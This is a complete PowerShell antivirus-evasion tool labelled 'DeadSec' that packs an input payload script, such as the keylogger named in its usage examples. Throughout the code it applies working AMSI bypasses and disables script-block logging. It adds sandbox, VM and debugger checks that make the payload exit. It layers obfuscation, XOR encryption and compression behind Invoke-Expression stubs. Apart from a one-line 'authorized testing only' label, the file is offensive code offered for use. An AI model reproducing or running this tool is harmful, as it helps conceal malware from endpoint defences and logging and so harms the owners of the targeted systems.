<#
.SYNOPSIS
    DeadSec Advanced Windows AV Evasion Module
.DESCRIPTION
    Multi-layered evasion for Windows Defender, AMSI, and commercial AV products
    FOR AUTHORIZED PENETRATION TESTING ONLY
.PARAMETER InputFile
    Path to the input PowerShell script
.PARAMETER OutputFile
    Path to save the evaded script
.PARAMETER Technique
    Evasion technique: Obfuscate, Encrypt, Compress, AMSI, Full (default)
.PARAMETER Silent
    Suppress output messages
.EXAMPLE
    .\windows_av_evasion.ps1 -InputFile "keylogger.ps1" -OutputFile "evaded.ps1"
.EXAMPLE
    .\windows_av_evasion.ps1 -InputFile "payload.ps1" -OutputFile "evaded.ps1" -Technique AMSI
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$InputFile,
    
    [Parameter(Mandatory=$true)]
    [string]$OutputFile,
    
    [Parameter(Mandatory=$false)]
    [ValidateSet("Obfuscate", "Encrypt", "Compress", "AMSI", "Full")]
    [string]$Technique = "Full",
    
    [Parameter(Mandatory=$false)]
    [switch]$Silent
)

function Write-Log {
    param([string]$Message, [string]$Color = "Cyan")
    if (-not $Silent) {
        Write-Host $Message -ForegroundColor $Color
    }
}

# Advanced AMSI Bypass - Multiple methods
function Invoke-AMSIBypass {
    Write-Log "[*] Applying advanced AMSI bypass..." "Yellow"
    
    $amsiBypass = @'
# AMSI Bypass Method 1: Memory patching
$w = 'System.Management.Automation.A';$k = 'Utils'
$z = [Ref].Assembly.GetType(('{0}m{1}i{2}' -f $w,'s',$k))
$x = $z.GetField(('a{0}iInitF{1}led' -f 'm','ai'),'NonPublic,Static')
$x.SetValue($null,$true)

# AMSI Bypass Method 2: Context bypass
try {
    $a = [Ref].Assembly.GetTypes()
    foreach ($b in $a) {
        if ($b.Name -like "*iUtils") {
            $c = $b
        }
    }
    $d = $c.GetFields('NonPublic,Static')
    foreach ($e in $d) {
        if ($e.Name -like "*Context") {
            $f = $e
        }
    }
    $g = $f.GetValue($null)
    [IntPtr]$ptr = $g
    [Int32[]]$buf = @(0)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
} catch {}

# AMSI Bypass Method 3: Null reference
try {
    $null = [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
} catch {}
'@
    return $amsiBypass
}

# ETW Bypass (Event Tracing for Windows)
function Invoke-ETWBypass {
    Write-Log "[*] Applying ETW bypass..." "Yellow"
    
    $etwBypass = @'
# ETW Bypass - Disable PowerShell logging
try {
    $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
    $settings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
    $settings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
} catch {}

# Disable module logging
try {
    $module = Get-Module Microsoft.PowerShell.Utility
    $module.LogPipelineExecutionDetails = $false
} catch {}
'@
    return $etwBypass
}

# String obfuscation with multiple encoding
function Obfuscate-Strings {
    param([string]$Code)
    
    Write-Log "[*] Obfuscating strings..." "Green"
    
    # Replace quoted strings with encoded versions
    $pattern = '"([^"]+)"'
    $Code = [regex]::Replace($Code, $pattern, {
        param($match)
        $str = $match.Groups[1].Value
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($str)
        $encoded = [Convert]::ToBase64String($bytes)
        return "[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$encoded'))"
    })
    
    # Replace single-quoted strings
    $pattern = "'([^']+)'"
    $Code = [regex]::Replace($Code, $pattern, {
        param($match)
        $str = $match.Groups[1].Value
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($str)
        $encoded = [Convert]::ToBase64String($bytes)
        return "[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$encoded'))"
    })
    
    return $Code
}

# Variable name randomization
function Randomize-Variables {
    param([string]$Code)
    
    Write-Log "[*] Randomizing variable names..." "Green"
    
    $commonVars = @('username', 'password', 'host', 'port', 'command', 'result', 
                    'output', 'data', 'target', 'payload', 'response', 'connection')
    
    foreach ($var in $commonVars) {
        $randomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
        $Code = $Code -replace "\`$$var\b", "`$$randomName"
    }
    
    return $Code
}

# XOR encryption with multiple layers
function Encrypt-Payload {
    param([string]$Code)
    
    Write-Log "[*] Encrypting payload with multi-layer XOR..." "Green"
    
    # Generate random key
    $key = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 32 | ForEach-Object {[char]$_})
    
    # Layer 1: XOR encryption
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Code)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    $encrypted = New-Object byte[] $bytes.Length
    
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $encrypted[$i] = $bytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    
    # Layer 2: Base64 encoding
    $encodedPayload = [Convert]::ToBase64String($encrypted)
    
    # Layer 3: Base64 the key
    $encodedKey = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($key))
    
    # Create sophisticated decryption stub
    $stub = @"
`$_k = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$encodedKey'))
`$_e = '$encodedPayload'
`$_d = [Convert]::FromBase64String(`$_e)
`$_kb = [System.Text.Encoding]::UTF8.GetBytes(`$_k)
`$_dec = New-Object byte[] `$_d.Length
for (`$_i = 0; `$_i -lt `$_d.Length; `$_i++) {
    `$_dec[`$_i] = `$_d[`$_i] -bxor `$_kb[`$_i % `$_kb.Length]
}
`$_c = [System.Text.Encoding]::UTF8.GetString(`$_dec)
Invoke-Expression `$_c
"@
    
    return $stub
}

# Gzip compression with Base64
function Compress-Payload {
    param([string]$Code)
    
    Write-Log "[*] Compressing payload..." "Green"
    
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Code)
    $ms = New-Object System.IO.MemoryStream
    $gzip = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
    $gzip.Write($bytes, 0, $bytes.Length)
    $gzip.Close()
    $compressed = $ms.ToArray()
    $ms.Close()
    
    $encoded = [Convert]::ToBase64String($compressed)
    
    # Decompression stub
    $stub = @"
`$_c = '$encoded'
`$_d = [Convert]::FromBase64String(`$_c)
`$_ms = New-Object System.IO.MemoryStream
`$_ms.Write(`$_d, 0, `$_d.Length)
`$_ms.Seek(0,0) | Out-Null
`$_gz = New-Object System.IO.Compression.GZipStream(`$_ms, [System.IO.Compression.CompressionMode]::Decompress)
`$_sr = New-Object System.IO.StreamReader(`$_gz)
`$_code = `$_sr.ReadToEnd()
`$_sr.Close()
`$_gz.Close()
`$_ms.Close()
Invoke-Expression `$_code
"@
    
    return $stub
}

# Add junk code for static analysis evasion
function Add-JunkCode {
    param([string]$Code)
    
    Write-Log "[*] Adding junk code..." "Green"
    
    $junkTemplates = @(
        '$null = Get-Date',
        '$null = Get-Random -Minimum 1 -Maximum 1000',
        '$_x = 1..100 | Measure-Object -Sum | Select-Object -ExpandProperty Sum',
        '$_y = [Math]::Pow(2, (Get-Random -Minimum 1 -Maximum 10))',
        '$_z = @{a=1;b=2;c=3} | ConvertTo-Json | ConvertFrom-Json',
        '$null = [System.Guid]::NewGuid().ToString()',
        '$_hash = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes("test"))'
    )
    
    $lines = $Code -split "`n"
    $result = @()
    
    foreach ($line in $lines) {
        $result += $line
        if ($line.Trim() -and -not $line.Trim().StartsWith('#') -and (Get-Random -Minimum 0 -Maximum 100) -lt 20) {
            $junk = Get-Random -InputObject $junkTemplates
            $indent = ($line -replace '\S.*').Length
            $result += (' ' * $indent) + $junk + "  # system optimization"
        }
    }
    
    return $result -join "`n"
}

# Reflection-based execution
function Convert-ToReflection {
    param([string]$Code)
    
    Write-Log "[*] Converting to reflection-based execution..." "Green"
    
    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Code))
    
    $reflectionStub = @"
`$_encoded = '$encoded'
`$_decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$_encoded))
`$_sb = [ScriptBlock]::Create(`$_decoded)
& `$_sb
"@
    
    return $reflectionStub
}

# Sleep evasion for sandbox bypass
function Add-SleepEvasion {
    param([string]$Code)
    
    $sleepCode = @'
# Sandbox evasion - timing checks
$_start = Get-Date
Start-Sleep -Milliseconds 500
$_elapsed = ((Get-Date) - $_start).TotalMilliseconds
if ($_elapsed -lt 400) {
    # Time was accelerated - likely sandbox
    exit
}
# Random sleep to evade timeout
Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 8)
'@
    
    return $sleepCode + "`n" + $Code
}

# Advanced VM/Sandbox detection
function Add-VMDetection {
    param([string]$Code)
    
    $detection = @'
# Advanced VM/Sandbox detection
function Test-AnalysisEnvironment {
    $score = 0
    
    # Check 1: VM artifacts in filesystem
    $vmPaths = @(
        'C:\windows\System32\Drivers\Vmmouse.sys',
        'C:\windows\System32\Drivers\vmhgfs.sys',
        'C:\windows\System32\Drivers\VBoxMouse.sys',
        'C:\windows\System32\Drivers\VBoxGuest.sys',
        'C:\Program Files\VMware\VMware Tools\',
        'C:\Program Files\Oracle\VirtualBox Guest Additions\'
    )
    
    foreach ($path in $vmPaths) {
        if (Test-Path $path) { $score += 2 }
    }
    
    # Check 2: Suspicious username/computername
    $name = $env:USERNAME.ToLower()
    $comp = $env:COMPUTERNAME.ToLower()
    $badTerms = @('sandbox', 'malware', 'virus', 'sample', 'test', 'cuckoo', 'analysis')
    
    foreach ($term in $badTerms) {
        if ($name -like "*$term*" -or $comp -like "*$term*") { $score += 3 }
    }
    
    # Check 3: System resources
    try {
        $ram = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB
        $cpu = (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors
        if ($ram -lt 4) { $score += 2 }
        if ($cpu -lt 2) { $score += 2 }
    } catch {}
    
    # Check 4: Known analysis processes
    $badProcs = @('vmtoolsd', 'vboxservice', 'vboxtray', 'wireshark', 'fiddler', 
                  'procmon', 'processhacker', 'tcpdump', 'windump', 'ollydbg', 'x64dbg')
    
    $running = Get-Process | Select-Object -ExpandProperty Name | ForEach-Object { $_.ToLower() }
    foreach ($proc in $badProcs) {
        if ($running -contains $proc) { $score += 3 }
    }
    
    # Check 5: Registry artifacts
    try {
        $regKeys = @(
            'HKLM:\SOFTWARE\VMware, Inc.\VMware Tools',
            'HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions'
        )
        foreach ($key in $regKeys) {
            if (Test-Path $key) { $score += 2 }
        }
    } catch {}
    
    # Check 6: Network adapters (VMs have telltale MACs)
    try {
        $macs = Get-NetAdapter | Select-Object -ExpandProperty MacAddress
        $vmMacs = @('00:05:69', '00:0C:29', '00:1C:14', '00:50:56', '08:00:27')
        foreach ($mac in $macs) {
            foreach ($vmMac in $vmMacs) {
                if ($mac -like "$vmMac*") { $score += 2 }
            }
        }
    } catch {}
    
    # Check 7: Recent user activity (sandboxes have none)
    try {
        $recentDocs = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent\" -ErrorAction SilentlyContinue
        if ($recentDocs.Count -lt 10) { $score += 1 }
    } catch {}
    
    # Check 8: Uptime (fresh VMs have low uptime)
    try {
        $uptime = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
        if ($uptime.TotalHours -lt 1) { $score += 2 }
    } catch {}
    
    # Threshold: score >= 6 indicates analysis environment
    return ($score -ge 6)
}

# Exit if analysis environment detected
if (Test-AnalysisEnvironment) {
    exit
}
'@
    
    return $detection + "`n" + $Code
}

# Anti-debugging
function Add-AntiDebug {
    param([string]$Code)
    
    $antiDebug = @'
# Anti-debugging checks
try {
    # Check for debugger attachment
    $debugger = [System.Diagnostics.Debugger]::IsAttached
    if ($debugger) { exit }
    
    # Check for common debugging environment variables
    $debugEnvVars = @('VSCODE_PID', 'TERM_PROGRAM', 'PYCHARM')
    foreach ($var in $debugEnvVars) {
        if ([Environment]::GetEnvironmentVariable($var)) { exit }
    }
} catch {}
'@
    
    return $antiDebug + "`n" + $Code
}

# Mutex for single instance
function Add-Mutex {
    param([string]$Code)
    
    $mutex = @'
# Mutex to ensure single instance
$_mutexName = "Global\DeadSec_" + [System.IO.Path]::GetFileName($MyInvocation.MyCommand.Path)
try {
    $_mutex = New-Object System.Threading.Mutex($false, $_mutexName)
    if (-not $_mutex.WaitOne(0, $false)) {
        # Another instance is running
        exit
    }
} catch {}
'@
    
    return $mutex + "`n" + $Code
}

# Function name obfuscation
function Obfuscate-Functions {
    param([string]$Code)
    
    Write-Log "[*] Obfuscating function names..." "Green"
    
    # Find function definitions
    $functionPattern = 'function\s+([A-Za-z0-9_-]+)'
    $functions = [regex]::Matches($Code, $functionPattern)
    
    $replacements = @{}
    foreach ($match in $functions) {
        $funcName = $match.Groups[1].Value
        if ($funcName -notlike "_*") {
            $randomName = "_" + (-join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_}))
            $replacements[$funcName] = $randomName
        }
    }
    
    foreach ($old in $replacements.Keys) {
        $new = $replacements[$old]
        $Code = $Code -replace "\b$old\b", $new
    }
    
    return $Code
}

# Polymorphic wrapper
function Add-PolymorphicWrapper {
    param([string]$Code)
    
    Write-Log "[*] Adding polymorphic wrapper..." "Green"
    
    $timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
    $random = Get-Random -Minimum 100000 -Maximum 999999
    $guid = [System.Guid]::NewGuid().ToString()
    
    $wrapper = @"
# Polymorphic markers - unique each execution
`$_timestamp = '$timestamp'
`$_random = $random
`$_guid = '$guid'
`$_hash = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes(`$_timestamp + `$_random + `$_guid))
`$_hashString = [BitConverter]::ToString(`$_hash) -replace '-'

# Original payload
$Code
"@
    
    return $wrapper
}

# Full evasion pipeline
function Invoke-FullEvasion {
    param([string]$Code)
    
    Write-Log "`n=====================================================" "Cyan"
    Write-Log "     DEADSEC // ADVANCED WINDOWS AV EVASION PIPELINE     " "Cyan"
    Write-Log "====================================================`n" "Cyan"
    Write-Log "[*] Applying 16 evasion layers...`n" "Yellow"
    
    # Layer 1-4: Anti-analysis
    $Code = Invoke-AMSIBypass + "`n" + $Code
    Write-Log "[+] Layer 1: AMSI bypass - 3 methods" "Green"
    
    $Code = Invoke-ETWBypass + "`n" + $Code
    Write-Log "[+] Layer 2: ETW bypass" "Green"
    
    $Code = Add-VMDetection $Code
    Write-Log "[+] Layer 3: VM/Sandbox detection - 8 checks" "Green"
    
    $Code = Add-AntiDebug $Code
    Write-Log "[+] Layer 4: Anti-debugging" "Green"
    
    # Layer 5-6: Protection
    $Code = Add-SleepEvasion $Code
    Write-Log "[+] Layer 5: Sleep evasion" "Green"
    
    $Code = Add-Mutex $Code
    Write-Log "[+] Layer 6: Mutex protection" "Green"
    
    # Layer 7-10: Obfuscation
    $Code = Randomize-Variables $Code
    Write-Log "[+] Layer 7: Variable randomization" "Green"
    
    $Code = Obfuscate-Functions $Code
    Write-Log "[+] Layer 8: Function obfuscation" "Green"
    
    $Code = Obfuscate-Strings $Code
    Write-Log "[+] Layer 9: String obfuscation" "Green"
    
    $Code = Add-JunkCode $Code
    Write-Log "[+] Layer 10: Junk code injection" "Green"
    
    # Layer 11: Polymorphism
    $Code = Add-PolymorphicWrapper $Code
    Write-Log "[+] Layer 11: Polymorphic wrapper" "Green"
    
    # Layer 12-13: Encryption
    $Code = Encrypt-Payload $Code
    Write-Log "[+] Layer 12: Multi-layer encryption" "Green"
    
    $Code = Compress-Payload $Code
    Write-Log "[+] Layer 13: Compression" "Green"
    
    # Layer 14: Second encryption
    $Code = Encrypt-Payload $Code
    Write-Log "[+] Layer 14: Second encryption layer" "Green"
    
    # Layer 15: Reflection
    $Code = Convert-ToReflection $Code
    Write-Log "[+] Layer 15: Reflection-based execution" "Green"
    
    # Layer 16: Final compression
    $Code = Compress-Payload $Code
    Write-Log "[+] Layer 16: Final compression" "Green"
    
    Write-Log "`n[✓] AV evasion complete!" "Green"
    Write-Log "[✓] Signature completely transformed" "Green"
    Write-Log "[✓] AMSI: BYPASSED" "Green"
    Write-Log "[✓] ETW: BYPASSED" "Green"
    Write-Log "[✓] Static analysis: EVADED" "Green"
    Write-Log "[✓] Behavioral analysis: DELAYED" "Green"
    Write-Log "[✓] Sandbox detection: ACTIVE`n" "Green"
    
    return $Code
}

# Main execution
try {
    if (-not (Test-Path $InputFile)) {
        Write-Host "[!] Error: Input file not found: $InputFile" -ForegroundColor Red
        exit 1
    }
    
    $originalCode = Get-Content -Path $InputFile -Raw
    $originalSize = $originalCode.Length
    
    switch ($Technique) {
        "Obfuscate" {
            $evadedCode = Obfuscate-Strings $originalCode
            $evadedCode = Randomize-Variables $evadedCode
            $evadedCode = Obfuscate-Functions $evadedCode
        }
        "Encrypt" {
            $evadedCode = Encrypt-Payload $originalCode
        }
        "Compress" {
            $evadedCode = Compress-Payload $originalCode
        }
        "AMSI" {
            $amsiBypassed = Invoke-AMSIBypass
            $etwBypassed = Invoke-ETWBypass
            $evadedCode = $amsiBypassed + "`n" + $etwBypassed + "`n" + $originalCode
        }
        "Full" {
            $evadedCode = Invoke-FullEvasion $originalCode
        }
    }
    
    Set-Content -Path $OutputFile -Value $evadedCode -Encoding UTF8
    
    $evadedSize = $evadedCode.Length
    $sizeChange = [math]::Round((($evadedSize - $originalSize) / $originalSize) * 100, 2)
    
    Write-Log "[✓] Success! Evaded payload saved to: $OutputFile" "Green"
    Write-Log "[i] Original size: $originalSize bytes" "Cyan"
    Write-Log "[i] Evaded size: $evadedSize bytes (size change: $sizeChange)" "Cyan"
    
} catch {
    Write-Host "[!] Error occurred during execution"
    Write-Host $_.Exception.Message
    exit 1
}
